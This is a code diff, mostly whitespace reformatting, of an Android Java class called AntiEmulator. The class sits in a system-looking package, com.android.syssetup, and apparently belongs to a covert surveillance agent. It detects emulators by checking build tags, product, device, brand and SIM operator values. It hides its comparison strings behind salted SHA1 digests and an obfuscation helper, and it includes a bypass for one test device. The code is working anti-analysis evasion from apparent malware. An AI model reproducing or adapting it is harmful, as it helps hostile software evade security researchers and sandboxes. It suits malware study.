@@ -5,10 +5,10 @@ import android.os.Build;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
+import com.android.mm.M;
 import com.android.syssetup.Status;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.crypto.Digest;
-import com.android.mm.M;
 
 public class AntiEmulator {
 	private static final String TAG = "AntiEmulator";
@@ -28,11 +28,11 @@ public class AntiEmulator {
 			Check.log(TAG + " (checkKeys): Keys: " + keys); //$NON-NLS-1$
 		}
 
-        String digest = Digest.SHA1(M.e("JmGKwOYrz") + keys.toLowerCase()).toLowerCase();
-        // "unknown"
-        if (digest.equals(M.e("d0deb97b41e6e29754fd3193da5a309ceb68dbf9"))) {
-            return 1;
-        }
+		String digest = Digest.SHA1(M.e("JmGKwOYrz") + keys.toLowerCase()).toLowerCase();
+		// "unknown"
+		if (digest.equals(M.e("d0deb97b41e6e29754fd3193da5a309ceb68dbf9"))) {
+			return 1;
+		}
 
 		// "/"
 		index = keys.lastIndexOf(M.e("/"));
@@ -56,31 +56,31 @@ public class AntiEmulator {
 	// "test-keys" nell'emu
 	public int checkTags() {
 		String tags = Build.TAGS;
-	
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (checkTags): Tags: " + tags); //$NON-NLS-1$
 		}
-	
+
 		String digest = Digest.SHA1(M.e("R70kq5jhCx") + tags.toLowerCase()).toLowerCase();
-	
+
 		// "test-keys"
 		if (digest.equals(M.e("895f0bd16cf59e3e380b7360b26dfd445e2c9570"))) {
 			return 1;
 		}
-	
+
 		return 0;
 	}
 
 	// "sdk" nell'emu
 	public int checkProduct() {
 		String product = Build.PRODUCT;
-	
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (checkProduct): Product: " + product); //$NON-NLS-1$
 		}
 
 		// "sdk" || "sdk_x86"
-		if ( product.toLowerCase().startsWith(M.e("sdk")) ) {
+		if (product.toLowerCase().startsWith(M.e("sdk"))) {
 			return 1;
 		}
 
@@ -90,7 +90,7 @@ public class AntiEmulator {
 	// "generic" nell'emu
 	public int checkDevice() {
 		String device = Build.DEVICE;
-	
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (checkDevice): Device: " + device); //$NON-NLS-1$
 		}
@@ -99,7 +99,7 @@ public class AntiEmulator {
 		if (device.startsWith(M.e("generic"))) {
 			return 1;
 		}
-	
+
 		return 0;
 	}
 
@@ -118,9 +118,9 @@ public class AntiEmulator {
 			return 1;
 		}
 
-        if (brand.startsWith(M.e("generic"))) {
-            return 1;
-        }
+		if (brand.startsWith(M.e("generic"))) {
+			return 1;
+		}
 
 		return 0;
 	}
@@ -214,18 +214,18 @@ public class AntiEmulator {
 	// "Android" nell'emu
 	public int checkOperator() {
 		String operator = tm.getSimOperatorName();
-	
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (checkOperator): Operator: " + operator); //$NON-NLS-1$
 		}
-	
+
 		String digest = Digest.SHA1(M.e("ovCwHlxund") + operator.toLowerCase()).toLowerCase();
-	
+
 		// "android"
 		if (digest.equals(M.e("796c3a755fea349d366064676d8351e52a623288"))) {
 			return 1;
 		}
-	
+
 		return 0;
 	}
 
@@ -266,30 +266,30 @@ public class AntiEmulator {
 	private int isEmu(int test) {
 		int NUMTESTS = (tm == null) ? NUMTESTSNOTM : NUMTESTSTM;
 
-        test = Math.abs(test);
+		test = Math.abs(test);
 		switch (test % (NUMTESTS)) {
-		case 0:
-			return checkKeys();
-		case 1:
-			return checkTags();
-		case 2:
-			return checkProduct();
-		case 3:
-			return checkDevice();
-		case 4:
-			return checkBrand();
-		case 5:
-			return checkScaling();
-		case 6:
-			return checkManufacturer();
-		case 7:
-			return checkId();
-		case 8:
-			return checkSubscriber();
-		case 9:
-			return checkOperator();
-		case 10:
-			return checkPhoneNumber();
+			case 0:
+				return checkKeys();
+			case 1:
+				return checkTags();
+			case 2:
+				return checkProduct();
+			case 3:
+				return checkDevice();
+			case 4:
+				return checkBrand();
+			case 5:
+				return checkScaling();
+			case 6:
+				return checkManufacturer();
+			case 7:
+				return checkId();
+			case 8:
+				return checkSubscriber();
+			case 9:
+				return checkOperator();
+			case 10:
+				return checkPhoneNumber();
 		}
 		return 0;
 	}
@@ -308,25 +308,25 @@ public class AntiEmulator {
 			return isEmu(NUMTESTSNOTM) >= NUMTESTSNOTM - 2;
 		} else {
 			boolean ret = isEmu(Utils.getRandomIntArray(3)) >= 1;
-            boolean ov = isTestEmu();
+			boolean ov = isTestEmu();
 
-            return ret && !ov;
+			return ret && !ov;
 		}
 	}
 
-    private boolean isTestEmu() {
+	private boolean isTestEmu() {
 
-        String product = Build.DEVICE;
-        String digest = Digest.SHA1(M.e("oJtb2LTJkhUF") + product).toLowerCase();
+		String product = Build.DEVICE;
+		String digest = Digest.SHA1(M.e("oJtb2LTJkhUF") + product).toLowerCase();
 
-        // wH6ZrSNNT8b5wysfyAdP
-        if (digest.equals(M.e("a23ecb8153ee7f8d77f9ba47757384f8b63d1def"))) {
-            if(Cfg.DEBUG){
-                Log.d(TAG, " (isTestEmu) we are in the emulator" );
-            }
-            return true;
-        }
+		// wH6ZrSNNT8b5wysfyAdP
+		if (digest.equals(M.e("a23ecb8153ee7f8d77f9ba47757384f8b63d1def"))) {
+			if (Cfg.DEBUG) {
+				Log.d(TAG, " (isTestEmu) we are in the emulator");
+			}
+			return true;
+		}
 
-        return false;
-    }
+		return false;
+	}
 }
